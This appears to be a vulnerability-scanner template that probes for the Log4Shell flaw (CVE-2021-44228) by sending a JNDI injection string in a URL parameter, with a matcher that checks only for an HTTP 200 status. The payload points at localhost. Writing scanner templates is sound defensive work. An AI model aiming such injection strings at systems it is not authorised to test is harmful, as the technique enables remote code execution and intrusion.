id: h4k-log4shell
info:
  name: Apache Log4Shell (CVE-2021-44228)
  author: h4k
  severity: critical
  description: Log4j JNDI injection probe (offline bundle template).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  metadata:
    cve: CVE-2021-44228
    cwe: CWE-502
http:
  - method: GET
    path:
      - "{{BaseURL}}/?h4k_probe=${jndi:ldap://127.0.0.1/a}"
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        condition: or
